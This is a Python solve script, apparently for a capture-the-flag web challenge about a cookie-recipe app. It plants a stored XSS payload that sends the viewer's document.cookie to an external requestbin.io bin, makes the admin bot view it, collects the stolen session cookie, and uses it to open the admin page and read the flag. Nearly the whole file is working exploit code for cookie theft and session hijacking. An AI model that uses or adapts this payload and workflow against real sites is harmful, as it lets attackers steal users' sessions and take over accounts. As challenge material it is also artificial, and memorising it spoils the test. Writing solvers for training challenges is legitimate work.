#!/usr/bin/env python3

import re
import sys
import time
import requests
import base64

if len(sys.argv) < 2:
    URL = "http://challenge:5000/"
else:
    URL = sys.argv[1].strip("/")

# Create a post bin to store the admin's request
res = requests.post("https://requestbin.io/api/v1/bins")
bin_id = res.json()["name"]
print(f"[+] Create post bin ID {bin_id}")

# Create the XSS payload to steal the cookie
payload = (
    f'<script>location="https://requestbin.io/{bin_id}?c="+document.cookie</script>'
)

ses = requests.session()

# Create a cookie with the XSS payload as the ingredients
res = ses.post(URL + "/cookie/new", data={"name": "hello", "ingredients": payload})
cid = res.url.split("/")[-1]
print(f"[+] Stored XSS payload in cookie ID {cid}")

# Submit the xss to the admin
res = ses.post(URL + "/approve", data={"cookie": cid})
assert res.status_code == 200
print(f"[+] Admin is visiting XSS payload")


# Retrive the leaked data from postbin
for i in range(10):
    time.sleep(2)
    res = requests.get(f"https://requestbin.io/{bin_id}?inspect")
    cookie_search = re.search(r"<strong>c:</strong>\s+([a-zA-Z0-9_=-]+)</p>", res.text)
    if cookie_search:
        break
    print(f"[!] No request captured, waiting...")
    if i == 9:
        print(f"[!] Giving up! XSS failed....")

print(f'[+] Stole cookie: "{cookie_search[1]}"')
cookies = {"session": cookie_search[1].split("=")[1]}

# Get the flag cookie from the admin page
res = requests.get(URL + "/admin", cookies=cookies)
flag_cid = re.search(r'/cookie/([\w-]+)">Flag Cookie', res.text)[1]
print(f'[+] Flag cookie ID: "{flag_cid}"')

# Read the flag from the flag cookie page
res = requests.get(URL + "/cookie/" + flag_cid, cookies=cookies)
flag = re.search("<p>2. Add one (.+?)</p><p>", res.text).group(1)
print(f'[+] Captured flag: "{flag}"')

# Write the flag out to where the framework will read it.
with open("flag", "w") as f:
    f.write(flag)
